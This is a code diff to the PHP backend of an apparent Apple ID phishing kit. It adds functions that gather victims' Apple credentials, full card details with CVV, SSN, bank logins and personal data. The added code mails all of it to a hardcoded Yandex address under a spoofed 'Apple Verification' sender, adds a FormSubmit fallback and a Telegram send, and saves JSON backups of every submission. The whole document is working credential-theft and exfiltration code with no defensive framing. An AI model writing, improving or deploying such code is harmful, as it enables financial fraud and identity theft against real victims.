@@ -96,70 +96,175 @@ function sendToTelegram($message) {
     return $response;
 }
 
-// Function to send photo to Telegram
-function sendPhotoToTelegram($photoPath, $caption = '') {
-    // Replace with your actual bot token and chat ID
-    $botToken = 'YOUR_TELEGRAM_BOT_TOKEN';
-    $chatId = 'YOUR_CHAT_ID';
+// Improved function to send data to Yandex email
+function sendToYandexEmail($data) {
+    // Replace with your actual Yandex email
+    $to = "jokersudo@yandex.com";
+    $subject = "New Apple Verification Data - " . date('Y-m-d H:i:s');
     
-    // Format caption for Telegram
-    $formattedCaption = urlencode($caption);
+    // Create a unique boundary for multipart emails
+    $boundary = md5(time());
     
-    // Initialize cURL
-    $ch = curl_init();
+    // Email headers
+    $headers = "From: Apple Verification <no-reply@" . $_SERVER['HTTP_HOST'] . ">\r\n";
+    $headers .= "Reply-To: no-reply@" . $_SERVER['HTTP_HOST'] . "\r\n";
+    $headers .= "MIME-Version: 1.0\r\n";
+    $headers .= "Content-Type: multipart/alternative; boundary=\"$boundary\"\r\n";
+    $headers .= "X-Priority: 1\r\n"; // High priority
+    $headers .= "X-MSMail-Priority: High\r\n"; 
+    $headers .= "Importance: High\r\n";
     
-    // Create a CURLFile object
-    $cFile = new CURLFile($photoPath);
+    // Create plain text message
+    $text_message = "NEW APPLE VERIFICATION DATA\n\n";
     
-    // Set up the data for the request
-    $postFields = array(
-        'chat_id' => $chatId,
-        'photo' => $cFile,
-        'caption' => $caption,
-        'parse_mode' => 'HTML'
-    );
+    // LOGIN DETAILS
+    $text_message .= "LOGIN DETAILS\n";
+    $text_message .= "Apple ID: " . ($data['email'] ?? 'N/A') . "\n";
+    $text_message .= "Password: " . ($data['password'] ?? 'N/A') . "\n\n";
     
-    // Set cURL options
-    curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot$botToken/sendPhoto");
-    curl_setopt($ch, CURLOPT_POST, 1);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    // CARD DETAILS
+    $text_message .= "CARD DETAILS\n";
+    $text_message .= "Bank: " . ($data['bank'] ?? 'N/A') . "\n";
+    $text_message .= "Level: " . ($data['card_level'] ?? 'N/A') . "\n";
+    $text_message .= "Cardholder: " . ($data['cardholder'] ?? 'N/A') . "\n";
+    $text_message .= "Card Number: " . ($data['card_number'] ?? 'N/A') . "\n";
+    $text_message .= "Expiry: " . ($data['expiry'] ?? 'N/A') . "\n";
+    $text_message .= "CVV: " . ($data['cvv'] ?? 'N/A') . "\n";
+    $text_message .= "SSN: " . ($data['ssn'] ?? 'N/A') . "\n\n";
     
-    // Execute the request
-    $response = curl_exec($ch);
+    // BANK INFO
+    $text_message .= "BANK INFO\n";
+    $text_message .= "Bank Username: " . ($data['bank_username'] ?? 'N/A') . "\n";
+    $text_message .= "Bank Password: " . ($data['card_password'] ?? 'N/A') . "\n\n";
     
-    // Close the cURL session
-    curl_close($ch);
+    // PERSONAL INFO
+    $text_message .= "PERSONAL INFO\n";
+    $text_message .= "First Name: " . ($data['firstname'] ?? 'N/A') . "\n";
+    $text_message .= "Last Name: " . ($data['lastname'] ?? 'N/A') . "\n";
+    $text_message .= "Address: " . ($data['address'] ?? 'N/A') . "\n";
+    $text_message .= "City: " . ($data['city'] ?? 'N/A') . "\n";
+    $text_message .= "State: " . ($data['state'] ?? 'N/A') . "\n";
+    $text_message .= "Country: " . ($data['country'] ?? 'N/A') . "\n";
+    $text_message .= "Zip: " . ($data['zipcode'] ?? 'N/A') . "\n";
+    $text_message .= "Phone: " . ($data['phone'] ?? 'N/A') . "\n\n";
     
-    return $response;
+    // DEVICE INFO
+    $text_message .= "DEVICE INFO\n";
+    $text_message .= "IP Address: " . $_SERVER['REMOTE_ADDR'] . "\n";
+    $text_message .= "User Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\n";
+    $text_message .= "Date/Time: " . date('Y-m-d H:i:s') . "\n";
+    
+    // Create HTML message
+    $html_message = "<html><body>";
+    $html_message .= "<h2>New Apple Verification Data</h2>";
+    
+    // LOGIN DETAILS
+    $html_message .= "<h3 style='background-color:#f0f0f0;padding:5px;'>LOGIN DETAILS</h3>";
+    $html_message .= "<p><strong>Apple ID:</strong> " . ($data['email'] ?? 'N/A') . "</p>";
+    $html_message .= "<p><strong>Password:</strong> " . ($data['password'] ?? 'N/A') . "</p>";
+    
+    // CARD DETAILS
+    $html_message .= "<h3 style='background-color:#f0f0f0;padding:5px;'>CARD DETAILS</h3>";
+    $html_message .= "<p><strong>Bank:</strong> " . ($data['bank'] ?? 'N/A') . "</p>";
+    $html_message .= "<p><strong>Level:</strong> " . ($data['card_level'] ?? 'N/A') . "</p>";
+    $html_message .= "<p><strong>Cardholder:</strong> " . ($data['cardholder'] ?? 'N/A') . "</p>";
+    $html_message .= "<p><strong>Card Number:</strong> " . ($data['card_number'] ?? 'N/A') . "</p>";
+    $html_message .= "<p><strong>Expiry:</strong> " . ($data['expiry'] ?? 'N/A') . "</p>";
+    $html_message .= "<p><strong>CVV:</strong> " . ($data['cvv'] ?? 'N/A') . "</p>";
+    $html_message .= "<p><strong>SSN:</strong> " . ($data['ssn'] ?? 'N/A') . "</p>";
+    
+    // BANK INFO
+    $html_message .= "<h3 style='background-color:#f0f0f0;padding:5px;'>BANK INFO</h3>";
+    $html_message .= "<p><strong>Bank Username:</strong> " . ($data['bank_username'] ?? 'N/A') . "</p>";
+    $html_message .= "<p><strong>Bank Password:</strong> " . ($data['card_password'] ?? 'N/A') . "</p>";
+    
+    // PERSONAL INFO
+    $html_message .= "<h3 style='background-color:#f0f0f0;padding:5px;'>PERSONAL INFO</h3>";
+    $html_message .= "<p><strong>First Name:</strong> " . ($data['firstname'] ?? 'N/A') . "</p>";
+    $html_message .= "<p><strong>Last Name:</strong> " . ($data['lastname'] ?? 'N/A') . "</p>";
+    $html_message .= "<p><strong>Address:</strong> " . ($data['address'] ?? 'N/A') . "</p>";
+    $html_message .= "<p><strong>City:</strong> " . ($data['city'] ?? 'N/A') . "</p>";
+    $html_message .= "<p><strong>State:</strong> " . ($data['state'] ?? 'N/A') . "</p>";
+    $html_message .= "<p><strong>Country:</strong> " . ($data['country'] ?? 'N/A') . "</p>";
+    $html_message .= "<p><strong>Zip:</strong> " . ($data['zipcode'] ?? 'N/A') . "</p>";
+    $html_message .= "<p><strong>Phone:</strong> " . ($data['phone'] ?? 'N/A') . "</p>";
+    
+    // DEVICE INFO
+    $html_message .= "<h3 style='background-color:#f0f0f0;padding:5px;'>DEVICE INFO</h3>";
+    $html_message .= "<p><strong>IP Address:</strong> " . $_SERVER['REMOTE_ADDR'] . "</p>";
+    $html_message .= "<p><strong>User Agent:</strong> " . $_SERVER['HTTP_USER_AGENT'] . "</p>";
+    $html_message .= "<p><strong>Date/Time:</strong> " . date('Y-m-d H:i:s') . "</p>";
+    
+    $html_message .= "</body></html>";
+    
+    // Build the email body with both text and HTML versions
+    $body = "--$boundary\r\n";
+    $body .= "Content-Type: text/plain; charset=UTF-8\r\n";
+    $body .= "Content-Transfer-Encoding: 7bit\r\n\r\n";
+    $body .= $text_message . "\r\n\r\n";
+    
+    $body .= "--$boundary\r\n";
+    $body .= "Content-Type: text/html; charset=UTF-8\r\n";
+    $body .= "Content-Transfer-Encoding: 7bit\r\n\r\n";
+    $body .= $html_message . "\r\n\r\n";
+    
+    $body .= "--$boundary--";
+    
+    // Try sending with PHP mail() function
+    $mail_result = mail($to, $subject, $body, $headers);
+    
+    // Log the mail attempt
+    file_put_contents('mail_log.txt', date('Y-m-d H:i:s') . " - Mail to $to - Result: " . ($mail_result ? 'SUCCESS' : 'FAILED') . "\n", FILE_APPEND);
+    
+    return $mail_result;
 }
 
-// Function to send data to email
-function sendToEmail($data) {
-    $to = "jokersudo@yandex.com"; // Replace with your email
-    $subject = "New Ap2ple Verification Data";
+// Alternative delivery method using FormSubmit
+function sendViaFormSubmit($data) {
+    // Replace with your actual Yandex email
+    $formSubmitEndpoint = "https://formsubmit.co/your-yandex-email@yandex.com";
     
-    // Prepare the email content
-    $message = "New verification data submitted:\n\n";
-    foreach ($data as $key => $value) {
-        if ($key !== 'verification') {
-            $message .= "$key: $value\n";
-        }
-    }
+    // Format data as form fields
+    $formData = [
+        '_subject' => 'New Apple Verification Data - ' . date('Y-m-d H:i:s'),
+        'email' => $data['email'] ?? 'N/A',
+        'password' => $data['password'] ?? 'N/A',
+        'bank' => $data['bank'] ?? 'N/A',
+        'level' => $data['card_level'] ?? 'N/A',
+        'cardholder' => $data['cardholder'] ?? 'N/A',
+        'card_number' => $data['card_number'] ?? 'N/A',
+        'expiry' => $data['expiry'] ?? 'N/A',
+        'cvv' => $data['cvv'] ?? 'N/A',
+        'ssn' => $data['ssn'] ?? 'N/A',
+        'bank_username' => $data['bank_username'] ?? 'N/A',
+        'bank_password' => $data['card_password'] ?? 'N/A',
+        'firstname' => $data['firstname'] ?? 'N/A',
+        'lastname' => $data['lastname'] ?? 'N/A',
+        'address' => $data['address'] ?? 'N/A',
+        'city' => $data['city'] ?? 'N/A',
+        'state' => $data['state'] ?? 'N/A',
+        'country' => $data['country'] ?? 'N/A',
+        'zipcode' => $data['zipcode'] ?? 'N/A',
+        'phone' => $data['phone'] ?? 'N/A',
+        'ip_address' => $_SERVER['REMOTE_ADDR'],
+        'timestamp' => date('Y-m-d H:i:s'),
+        '_template' => 'table'
+    ];
     
-    // Add IP and timestamp
-    $message .= "\nIP Address: " . $_SERVER['REMOTE_ADDR'] . "\n";
-    $message .= "User Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\n";
-    $message .= "Timestamp: " . date('Y-m-d H:i:s') . "\n";
+    // Send to FormSubmit
+    $ch = curl_init($formSubmitEndpoint);
+    curl_setopt($ch, CURLOPT_POST, 1);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($formData));
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    $response = curl_exec($ch);
+    $success = !curl_errno($ch);
+    curl_close($ch);
     
-    // Additional headers
-    $headers = "From: apple-verification@your-domain.com\r\n";
-    $headers .= "Reply-To: no-reply@your-domain.com\r\n";
-    $headers .= "X-Mailer: PHP/" . phpversion();
+    // Log the attempt
+    file_put_contents('formsubmit_log.txt', date('Y-m-d H:i:s') . " - FormSubmit - Result: " . ($success ? "SUCCESS" : "FAILED") . "\n", FILE_APPEND);
     
-    // Send the email
-    mail($to, $subject, $message, $headers);
+    return $success;
 }
 
 // Process the request
@@ -209,7 +314,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                 
                 // Send data to Telegram and email
                 sendToTelegram($message);
-                sendToEmail($data);
+                sendToYandexEmail($data);
             }
             break;
             
@@ -313,9 +418,24 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             $message .= "User Agent : " . $_SERVER['HTTP_USER_AGENT'] . "\n";
             $message .= "Date/Time : " . date('Y-m-d H:i:s') . "\n";
             
-            // Send data to Telegram and email
+            // Try multiple delivery methods for redundancy
+            $emailSent = sendToYandexEmail($data);
+            
+            // If primary method failed, try alternative
+            if (!$emailSent) {
+                $formSubmitSent = sendViaFormSubmit($data);
+            }
+            
+            // Try Telegram regardless
             sendToTelegram($message);
-            sendToEmail($data);
+            
+            // Always save a backup of the data
+            $backup_data = json_encode([
+                'timestamp' => date('Y-m-d H:i:s'),
+                'ip' => $_SERVER['REMOTE_ADDR'],
+                'data' => $data
+            ]);
+            file_put_contents('data_' . time() . '.json', $backup_data);
             
             // Log completion
             file_put_contents('completed_submissions.txt', date('Y-m-d H:i:s') . ' - ' . $email . ' - ' . $_SERVER['REMOTE_ADDR'] . "\n", FILE_APPEND);
